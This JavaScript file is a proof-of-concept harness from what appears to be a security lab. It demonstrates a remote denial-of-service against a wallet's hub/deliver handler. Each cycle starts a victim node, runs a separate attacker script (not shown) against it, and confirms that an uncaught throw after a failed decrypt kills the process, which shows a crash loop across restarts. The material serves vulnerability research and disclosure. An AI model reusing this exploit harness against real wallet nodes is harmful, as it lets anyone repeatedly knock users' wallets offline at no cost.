// Q-1 max-impact PoC: crash-loop delivery harness (final package, E3-6)
// Proves the remote zero-cost wallet crash persists across restarts:
//   cycle: spawn victim (own hub bServeAsHub + device identity) -> attacker hub/deliver
//          -> clean "failed to decrypt" -> 100ms later uncaught throw -> process death (exit 101)
//          -> restart -> repeat.
// Real path: real network listener (ws), real hub/deliver handler, real device.js
// decryptPackage else-branch (scheduled setTimeout throw outside the try/catch).
//
// Usage: node q1-loop.js [cycles]   (default 3)
// Depends: e2-16-victim.js (victim), e2-16-attacker.js (attacker), e17b-boot.js (lab boot).
"use strict";
const { spawn, execSync } = require("child_process");
const path = require("path");
const fs = require("fs");

const LAB = __dirname;
const VICTIM = path.join(LAB, "e2-16-victim.js");
const ATTACKER = path.join(LAB, "e2-16-attacker.js");
const CYCLES = parseInt(process.argv[2] || "3", 10);
const PORT = parseInt(process.env.PORT || "6611", 10);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function startVictim(cycle) {
  return new Promise((resolve, reject) => {
    const dataDir = path.join(LAB, ".q1-loop-data-" + cycle);
    fs.rmSync(dataDir, { recursive: true, force: true });
    const child = spawn("node", [VICTIM], {
      env: { ...process.env, PORT: String(PORT), DATA_DIR: dataDir },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let buf = "";
    const timer = setTimeout(() => reject(new Error("victim boot timeout")), 300000);
    child.stdout.on("data", d => {
      buf += d.toString();
      const m = buf.match(/device address: ([A-Z2-7]+)/);
      if (m) {
        clearTimeout(timer);
        resolve({ child, addr: m[1], buf });
      }
    });
    child.stderr.on("data", d => { buf += "[stderr] " + d.toString(); });
    child.on("exit", code => { if (!child.readyResolved) reject(new Error("victim exited early: " + code)); });
    child.readyResolved = false;
    const origResolve = resolve;
    resolve = (v) => { child.readyResolved = true; origResolve(v); };
  });
}

function runAttacker(addr, round) {
  return new Promise((resolve) => {
    const child = spawn("node", [ATTACKER], {
      env: { ...process.env, VICTIM_ADDR: addr, VICTIM_URL: "ws://127.0.0.1:" + PORT, ATTACK_ROUND: String(round) },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let out = "";
    child.stdout.on("data", d => { out += d.toString(); });
    child.stderr.on("data", d => { out += "[stderr] " + d.toString(); });
    child.on("exit", () => resolve(out));
  });
}

function waitForDeath(child, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (r) => { if (!done) { done = true; resolve(r); } };
    child.on("exit", code => finish({ code }));
    setTimeout(() => finish({ code: null }), timeoutMs);
  });
}

async function main() {
  const results = [];
  for (let cycle = 1; cycle <= CYCLES; cycle++) {
    console.log(`\n===== CYCLE ${cycle}/${CYCLES} =====`);
    const victim = await startVictim(cycle);
    console.log("[loop] victim up, device:", victim.addr);
    const atkOut = await runAttacker(victim.addr, cycle);
    console.log("[loop] attacker output tail:\n" + atkOut.split("\n").slice(-4).join("\n"));
    const death = await waitForDeath(victim.child, 15000);
    if (death.code === null) {
      console.log("[loop] VICTIM SURVIVED (no crash) — unexpected");
      results.push({ cycle, crashed: false });
      victim.child.kill();
    } else {
      console.log("[loop] VICTIM CRASHED, exit code:", death.code, "(101 = uncaught throw handler marker)");
      results.push({ cycle, crashed: true, code: death.code });
    }
    await sleep(1000);
  }
  console.log("\n===== SUMMARY =====");
  for (const r of results) console.log(r);
  const allCrashed = results.every(r => r.crashed);
  console.log(`\nCRASH-LOOP PERSISTENCE: ${results.length}/${results.length} cycles crashed ${allCrashed ? "=> CONFIRMED" : "=> PARTIAL"}`);
  process.exit(allCrashed ? 0 : 1);
}

main().catch(e => { console.error("LOOP-ERR", e); process.exit(2); });
